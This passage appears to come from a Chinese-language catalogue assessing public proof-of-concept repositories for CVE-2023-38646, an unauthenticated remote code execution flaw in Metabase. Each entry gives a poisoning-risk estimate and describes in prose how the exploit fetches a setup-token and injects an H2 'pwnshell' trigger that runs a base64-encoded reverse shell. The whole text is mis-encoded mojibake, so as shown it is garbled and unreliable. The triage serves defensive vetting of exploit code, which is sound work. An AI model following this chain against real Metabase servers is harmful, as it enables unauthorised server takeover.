è¯¥å­˜å‚¨åº“çš„ä¸»è¦ä»£ç æ–‡ä»¶æ˜¯ `exploit.py`ã€‚ä»”ç»†æ£€æŸ¥æ­¤æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨ CVE-2023-38646 æ¼æ´ï¼Œå…è®¸è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ ä½†æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä½œè€…å¦‚æœå°†åå¼¹shellçš„IPæˆ–è€…ç«¯å£å†™æ­»ï¼Œå°±æœ‰å¯èƒ½è¢«ä½œè€…æ§åˆ¶ã€‚
`README.md` æ–‡ä»¶ä»…åŒ…å«æœ‰å…³æ¼æ´å’Œä½¿ç”¨è„šæœ¬çš„è¯´æ˜ã€‚å®ƒè¿˜åŒ…å«å¯¹åŸå§‹æ¼æ´å‘ç°å’Œç›¸å…³æ¼æ´åˆ©ç”¨çš„ credit é“¾æ¥ï¼Œè¿™è¡¨æ˜ä½œè€…æ²¡æœ‰è¯•å›¾éšè—è„šæœ¬çš„ç›®çš„ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [passwa11/CVE-2023-38646](https://github.com/passwa11/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #25

**æ¥æº**: [CVE-2023-38646-securezeron_CVE-2023-38646.md](../2023/CVE-2023-38646-securezeron_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** ç¬¬ä¸€ä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-POC.py`ï¼‰ç”¨äºè·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚å®ƒå°è¯•é€šè¿‡HTTPå’ŒHTTPSè¿æ¥åˆ°ç›®æ ‡IPåœ°å€ï¼Œå¹¶è¯·æ±‚`/api/session/properties`ç«¯ç‚¹ï¼Œè§£æè¿”å›çš„JSONæ•°æ®ï¼Œä»ä¸­æå–`setup-token`ã€‚
2.  **åˆ©ç”¨Setup Tokenæ‰§è¡Œå‘½ä»¤ï¼š** ç¬¬äºŒä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-Reverse-Shell.py`ï¼‰åˆ©ç”¨è·å–åˆ°çš„Setup Tokenï¼Œå‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®ã€‚è¯¥é…ç½®ä½¿ç”¨H2æ•°æ®åº“å¼•æ“ï¼Œå¹¶åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ³¨å…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨`pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œä¹‹å‰è§¦å‘ï¼Œä»è€Œæ‰§è¡ŒBase64ç¼–ç çš„payloadï¼Œpayloadè§£ç åæ‰§è¡Œåå‘shellå‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

ä»æä¾›çš„æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’ŒPOCä»£ç æ¥çœ‹ï¼Œè¯¥æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æœç´¢ç»“æœä¸­åŒ…å«äº†å¤šä¸ªå…³äºæ­¤æ¼æ´çš„æè¿°ã€åˆ©ç”¨æ–¹æ³•ä»¥åŠPOCä»£ç çš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

*   ç¬¬ä¸€ä¸ªè„šæœ¬`CVE-2023-38646-POC.py`åªæ˜¯ç”¨æ¥è·å–setup tokenï¼Œæœ¬èº«ä¸åŒ…å«ä»»ä½•æ¶æ„ä»£ç ã€‚
*   ç¬¬äºŒä¸ªè„šæœ¬`CVE-2023-38646-Reverse-Shell.py`åŒ…å«åå‘shellçš„payloadï¼Œè¿™éƒ¨åˆ†æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆï¼Œä¸èƒ½ç®—ä½œæŠ•æ¯’ä»£ç ã€‚å¯èƒ½çš„æŠ•æ¯’é£é™©åœ¨äºï¼š
    *   **Payloadæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼š** è™½ç„¶å½“å‰Payloadæ˜¯åå‘shellï¼Œä½†æ”»å‡»è€…å¯èƒ½ä¿®æ”¹Payloadï¼Œæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼Œæ¯”å¦‚æ•°æ®çªƒå–ã€å‹’ç´¢è½¯ä»¶ç­‰ã€‚
    *   **ä¾èµ–é¡¹é£é™©ï¼š** è„šæœ¬ä¾èµ–requestsåº“ï¼Œå¦‚æœrequestsåº“æœ¬èº«è¢«æŠ•æ¯’ï¼Œå¯èƒ½å¼•å…¥å®‰å…¨é£é™©ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªè„šæœ¬æœ¬èº«ï¼Œæ¯”å¦‚åå‘shell çš„IPåœ°å€ã€ç«¯å£è¢«æ›¿æ¢æˆæ”»å‡»è€…æ§åˆ¶çš„è‚‰é¸¡ä»è€Œè¿›è¡Œè·³æ¿æ”»å‡»ï¼Œä»¥åŠå®‰è£…æ¶æ„ä¾èµ–é¡¹çš„å¯èƒ½ã€‚

æ€»ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯åˆ©ç”¨æœªæˆæƒçš„setupæ¥å£ï¼Œé€šè¿‡æ³¨å…¥æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [securezeron/CVE-2023-38646](https://github.com/securezeron/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #26

**æ¥æº**: [CVE-2023-38646-threatHNTR_CVE-2023-38646.md](../2023/CVE-2023-38646-threatHNTR_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ PoC ä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† Metabase å®‰è£…è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå³åœ¨è®¾ç½®è¿‡ç¨‹ä¸­å¯ä»¥æŒ‡å®šæ•°æ®åº“è¿æ¥ï¼Œå¹¶ä¸”æœªå¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²è¿›è¡Œå……åˆ†çš„éªŒè¯ã€‚é€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

*   è¯¥PoCé¦–å…ˆè·å– `setup-token` å’Œ Metabase ç‰ˆæœ¬ä¿¡æ¯ã€‚
*   ç„¶åï¼Œå¯¹åŒ…å«åå‘shellå‘½ä»¤çš„payloadè¿›è¡Œbase64ç¼–ç ã€‚
*   æ¥ç€ï¼Œå®ƒæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadï¼Œè¯¥å­—ç¬¦ä¸²åˆ©ç”¨äº†`CREATE TRIGGER` è¯­å¥å’Œå†…åµŒçš„JavaScriptä»£ç æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚
*   æœ€åï¼Œå®ƒå°†æ­¤payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œåå¼¹shellåˆ°æ”»å‡»è€…æ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚

å‚è€ƒæœç´¢ç»“æœ [7] æä¾›äº† GitHub é“¾æ¥ï¼Œè¿›ä¸€æ­¥è¯å®äº† PoC çš„å­˜åœ¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è™½ç„¶PoCæœ¬èº«çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€å®šç¨‹åº¦çš„æŠ•æ¯’é£é™©ã€‚PoCä»£ç ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå¼¹shellçš„IPåœ°å€å’Œç«¯å£ã€‚å¦‚æœæ”»å‡»è€…æ¶æ„ä¿®æ”¹PoCä»£ç ï¼Œä¾‹å¦‚æ·»åŠ é¢å¤–çš„åé—¨æˆ–æ¶æ„åŠŸèƒ½ï¼Œå¹¶å°†å…¶ä¼ æ’­ç»™å…¶ä»–ç”¨æˆ·ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ›´å¤§èŒƒå›´çš„æ”»å‡»ã€‚é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–ç¬¬ä¸‰æ–¹åº“:** æ£€æŸ¥ PoC ä»£ç ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚
*   **Payloadä¿®æ”¹:** ç”¨æˆ·å¯èƒ½ç›´æ¥ä½¿ç”¨ PoC ä»£ç ï¼Œè€Œä¸æ£€æŸ¥å…¶å†…å®¹ã€‚æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ payloadï¼Œä¾‹å¦‚æ¤å…¥æŒ–çŸ¿ç¨‹åºæˆ–è€…å…¶ä»–æ¶æ„è½¯ä»¶ã€‚
*   **ç¤¾åŒºä¼ æ’­:** ä¿®æ”¹åçš„ PoC ä»£ç å¯èƒ½åœ¨å®‰å…¨ç¤¾åŒºä¸­ä¼ æ’­ï¼Œå¯¼è‡´æ›´å¤šç”¨æˆ·å—åˆ°å½±å“ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©å¤§çº¦ä¸º 10%ã€‚è¿™ä¸ªç™¾åˆ†æ¯”å¹¶ä¸é«˜ï¼Œå› ä¸ºå¤§å¤šæ•°å®‰å…¨ç ”ç©¶äººå‘˜ä¼šæ£€æŸ¥ä»£ç åå†ä½¿ç”¨ï¼Œä½†ä»ç„¶éœ€è¦è­¦æƒ•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:**  åˆ©ç”¨ `/api/session/properties` ç«¯ç‚¹è·å– Metabase å®ä¾‹çš„ setup tokenã€‚
2.  **æ„é€ æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²:**  åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE TRIGGER`æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  **å‘é€è¯·æ±‚:**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
4.  **åå¼¹Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œç›®æ ‡ Metabase æœåŠ¡å™¨å°†åå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚
5.  **åˆ©ç”¨æœç´¢ç»“æœ** æœç´¢ç»“æœä¸­æåŠè¯¥æ¼æ´å¯èƒ½è¢«åˆ©ç”¨ (Web Attack: Metabase RCE Vulnerability CVE-2023-38646)ï¼Œå¹¶æä¾›äº†ç¼“è§£æªæ–½ï¼Œè¡¨æ˜è¯¥æ¼æ´åœ¨é‡å¤–å¯èƒ½è¢«åˆ©ç”¨ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   å°† Metabase å‡çº§åˆ°å—å½±å“ç‰ˆæœ¬ä»¥å¤–çš„ç‰ˆæœ¬ (>= 0.46.6.1 æˆ– >= 1.46.6.1)æˆ–å…¶ä»–ä¿®å¤ç‰ˆæœ¬ (0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2)ã€‚


**é¡¹ç›®åœ°å€:** [threatHNTR/CVE-2023-38646](https://github.com/threatHNTR/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #27

**æ¥æº**: [CVE-2023-38646-yxl2001_CVE-2023-38646.md](../2023/CVE-2023-38646-yxl2001_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 and < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Token:** é¦–å…ˆï¼Œåˆ©ç”¨`CVE-2023-38646-POC.py`è„šæœ¬ï¼Œé€šè¿‡è®¿é—®`/api/session/properties`æ¥å£æ¥è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚æ­¤æ­¥éª¤ç”¨äºåˆ¤æ–­ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œä»¥åŠè·å–åç»­åˆ©ç”¨æ‰€éœ€çš„tokenã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚:**  ä½¿ç”¨`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬ï¼Œè¯¥è„šæœ¬åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ `pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œï¼Œä»è€Œè§¦å‘ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è„šæœ¬å°†åå¼¹shellçš„bashå‘½ä»¤è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åå°†å…¶æ³¨å…¥åˆ°è§¦å‘å™¨ä¸­ã€‚
3.  **å‘é€ POST è¯·æ±‚:** å°†æ„é€ å¥½çš„åŒ…å«æ¶æ„ä»£ç çš„ JSON æ•°æ®é€šè¿‡ POST è¯·æ±‚å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚æ­¤è¯·æ±‚ä½¿ç”¨è·å–çš„ `setup-token` è¿›è¡ŒéªŒè¯ï¼Œå¹¶è§¦å‘ H2 æ•°æ®åº“è¿æ¥ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´çš„ POC ä»£ç æœ‰æ•ˆã€‚æœç´¢å¼•æ“ç»“æœä¹Ÿè¡¨æ˜å­˜åœ¨å…¬å¼€çš„ POC å¹¶ä¸”è¯¥æ¼æ´å·²è¢«ç§¯æåˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

`CVE-2023-38646-POC.py` è„šæœ¬åªæ˜¯ç”¨äºè·å– setup tokenï¼Œç›¸å¯¹å®‰å…¨ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ã€‚
`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬æœ¬èº«å®ç°äº†æ¼æ´åˆ©ç”¨ï¼Œä½†ä¸»è¦çš„åŠŸèƒ½æ˜¯å®ç°åå¼¹ shellã€‚ ä»£ç ä¸­å¯¹bashå‘½ä»¤è¿›è¡Œäº†base64ç¼–ç ,ä¸€å®šç¨‹åº¦ä¸Šå¢åŠ äº†ä»£ç é˜…è¯»çš„éš¾åº¦ã€‚å­˜åœ¨ä¸€å®šé£é™©ï¼š
    * ç¼–ç å¯èƒ½å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ï¼Œä¾‹å¦‚æ’å…¥é¢å¤–çš„å‘½ä»¤æˆ–ä¿®æ”¹åå¼¹ shell çš„è¡Œä¸ºã€‚å°½ç®¡ç›®å‰ä»£ç çœ‹ä¸Šå»æ˜¯å®ç°æ­£å¸¸çš„åå¼¹shellï¼Œä½†å­˜åœ¨è¢«ç¯¡æ”¹çš„å¯èƒ½æ€§ã€‚ä¾‹å¦‚ï¼Œåœ¨base64ç¼–ç å‰ååŠ å…¥æ¶æ„æŒ‡ä»¤ã€‚
    * è¯¥è„šæœ¬ä¾èµ–äºç›®æ ‡ç³»ç»Ÿä¸Šå­˜åœ¨ bash å’Œ base64 å‘½ä»¤ã€‚è™½ç„¶å¤§å¤šæ•° Linux ç³»ç»Ÿéƒ½åŒ…å«è¿™äº›å‘½ä»¤ï¼Œä½†åœ¨æŸäº›å—é™ç¯å¢ƒä¸­å¯èƒ½ä¸å­˜åœ¨ã€‚ä½œè€…æ¸…æ¥šè¿™ä¸€ç‚¹,ä½†å¹¶æœªå¯¹è¿™ç§æƒ…å†µè¿›è¡Œå¤„ç†,å®¹æ˜“é€ æˆè¯¯åˆ¤.
ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦çš„é£é™©é›†ä¸­åœ¨base64ç¼–ç å†…å®¹å¯èƒ½å­˜åœ¨è¢«ä¿®æ”¹æˆ–æ¤å…¥åé—¨çš„é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [yxl2001/CVE-2023-38646](https://github.com/yxl2001/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

